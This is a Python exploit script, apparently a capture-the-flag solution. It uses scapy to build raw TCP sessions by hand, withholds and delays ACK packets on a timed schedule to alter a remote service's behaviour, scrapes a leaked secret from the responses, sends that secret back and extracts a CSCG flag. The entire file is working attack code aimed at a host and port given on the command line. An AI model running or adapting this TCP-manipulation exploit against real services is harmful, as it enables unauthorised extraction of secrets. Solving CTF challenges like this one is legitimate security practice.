from scapy.all import *
import threading
import queue
import enum
import sys
import time


if len(sys.argv) < 3:
    print("usage: python3 exploit.py <host> <port>")

dhost = sys.argv[1]
shost = socket.gethostbyname(socket.gethostname())
dport = int(sys.argv[2])
sport = random.randint(1025, 65535)


class Callback(enum.IntEnum):
    SEND_ACK = 0


class TcpSession:
    def __init__(self, dhost, dport, shost, sport, timeout=3, verbose=1):
        self.seq = 0
        self.ack = 0
        self.ip = IP(dst=dhost, src=shost)
        self.sport = sport
        self.dport = dport
        self.connected = False
        self._mainloop_thread = None
        self._timeout = 3
        self.verbose = verbose
        self.received_bytes = b""
        self.acks = queue.Queue()
        self.callbacks = dict()
        self._init_callbacks()

    def _init_callbacks(self):
        self.callbacks[Callback.SEND_ACK] = lambda p: True
        # ....

    def register_callback(self, type_, callback):
        if not callable(callback):
            raise ValueError("Callback must be callable")
        self.callbacks[type_] = callback

    def send_stored_acks(self):
        while not self.acks.empty():
            p = self.acks.get()
            send(p, verbose=self.verbose)

    def _ack(self, p):
        self.ack = p[TCP].seq + len(p[Raw])
        ack = self.ip / TCP(
            sport=self.sport, dport=self.dport, flags="A", seq=self.seq, ack=self.ack
        )
        if self.callbacks[Callback.SEND_ACK](p):
            print("send ack")
            send(ack, verbose=self.verbose)
        else:
            print("put ack in queue")
            self.acks.put(ack)

    def _ack_rclose(self):
        self.connected = False

        self.ack += 1
        fin_ack = self.ip / TCP(
            sport=self.sport, dport=self.dport, flags="FA", seq=self.seq, ack=self.ack
        )
        ack = sr1(fin_ack, timeout=self._timeout, verbose=self.verbose)
        self.seq += 1

        assert ack.haslayer(TCP), "TCP layer missing"
        assert ack[TCP].flags & 0x10 == 0x10, "No ACK flag"
        assert ack[TCP].ack == self.seq, "Acknowledgment number error"

    def _mainloop(self):
        s = L3RawSocket()
        while self.connected:
            p = s.recv(MTU)
            self._parse_packet(p)
        s.close()
        self._mainloop_thread = None
        print("Mainloop thread stopped")

    def _parse_packet(self, p):
        if p.haslayer(TCP) and p.haslayer(Raw) and p[TCP].dport == self.sport:
            self._ack(p)
            self.received_bytes += p[Raw].load
        if (
            p.haslayer(TCP)
            and p[TCP].dport == self.sport
            and p[TCP].flags & 0x01 == 0x01
        ):  # FIN
            self._ack_rclose()

    def _start_mainloop(self):
        self._mainloop_thread = threading.Thread(name="Mainloop", target=self._mainloop)
        self._mainloop_thread.start()

    def connect(self):
        self.seq = random.randrange(0, (2 ** 32) - 1)

        syn = self.ip / TCP(sport=self.sport, dport=self.dport, seq=self.seq, flags="S")
        syn_ack = sr1(syn, timeout=self._timeout, verbose=self.verbose)
        self.seq += 1

        assert syn_ack.haslayer(TCP), "TCP layer missing"
        assert syn_ack[TCP].flags & 0x12 == 0x12, "No SYN/ACK flags"
        assert syn_ack[TCP].ack == self.seq, "Acknowledgment number error"

        self.ack = syn_ack[TCP].seq + 1
        ack = self.ip / TCP(
            sport=self.sport, dport=self.dport, seq=self.seq, flags="A", ack=self.ack
        )
        send(ack, verbose=self.verbose)

        self.connected = True
        self._start_mainloop()
        print("Connected")

    def close(self):
        self.connected = False

        fin = self.ip / TCP(
            sport=self.sport, dport=self.dport, flags="FA", seq=self.seq, ack=self.ack
        )
        fin_ack = sr1(fin, timeout=self._timeout, verbose=self.verbose)
        self.seq += 1

        assert fin_ack.haslayer(TCP), "TCP layer missing"
        assert fin_ack[TCP].flags & 0x11 == 0x11, "No FIN/ACK flags"
        assert fin_ack[TCP].ack == self.seq, "Acknowledgment number error"

        self.ack = fin_ack[TCP].seq + 1
        ack = self.ip / TCP(
            sport=self.sport, dport=self.dport, flags="A", seq=self.seq, ack=self.ack
        )
        send(ack, verbose=self.verbose)

        print("Disconnected")

    def build(self, payload):
        psh = (
            self.ip
            / TCP(
                sport=self.sport,
                dport=self.dport,
                flags="PA",
                seq=self.seq,
                ack=self.ack,
            )
            / payload
        )
        self.seq += len(psh[Raw])
        return psh

    def send(self, payload):
        psh = self.build(payload)
        ack = sr1(psh, timeout=self._timeout, verbose=self.verbose)

        assert ack.haslayer(TCP), "TCP layer missing"
        assert ack[TCP].flags & 0x10 == 0x10, "No ACK flag"
        assert ack[TCP].ack == self.seq, "Acknowledgment number error"


class StateSwitch:
    def __init__(self, should_before, should_after):
        self.should_before = should_before
        self.should_after = should_after

    def is_switched(self, before, after):
        return bool(self.should_before == before and self.should_after == after)


class PeriodicalCallback:
    def __init__(self, init_val, period_time, trigger_timer_switch, timer_new_val):
        self.state = init_val
        self.period_time = period_time
        self.trigger_timer_switch = trigger_timer_switch
        self.timer_new_val = timer_new_val

    def callback(self, pkt):
        before = self.state
        self._callback(pkt)
        after = self.state
        if self.trigger_timer_switch.is_switched(before, after):
            threading.Timer(self.period_time, self.reset_state).start()
        return self.state

    def reset_state(self):
        self.state = self.timer_new_val

    def wait_until_val(self, val):
        while self.state != val:
            time.sleep(0.1)

    def wait_until_switch(self, sw):
        while True:
            before = self.state
            time.sleep(0.1)
            after = self.state
            if sw.is_switched(before, after):
                break


class SendAckCallback(PeriodicalCallback):
    def __init__(self, init_val, period_time, trigger_timer_switch, timer_new_val):
        super().__init__(init_val, period_time, trigger_timer_switch, timer_new_val)
        self.counter = 0

    def switch_state(self):
        self.state = not self.state

    def _callback(self, pkt):
        self.counter += 1
        if self.counter == 12:
            self.state = False


sw = StateSwitch(True, False)
c = SendAckCallback(True, 12, sw, True)

s = TcpSession(dhost, dport, shost, sport, verbose=0)
s.register_callback(Callback.SEND_ACK, c.callback)
s.connect()
s.send(b"1\n")
c.wait_until_switch(StateSwitch(True, False))
print("Switched from True to False")

secret = re.findall(b"SECRET=\[.*?\]", s.received_bytes)[0][8:-1]
print("secret: {0}".format(str(secret)))

c.wait_until_switch(StateSwitch(False, True))
print("Switched from False to True")
s.send(secret)

while b"}" not in s.received_bytes:
    time.sleep(1)

flag = re.findall(b"CSCG\{.*?\}", s.received_bytes)[0]
print("flag: {0}".format(str(flag)))
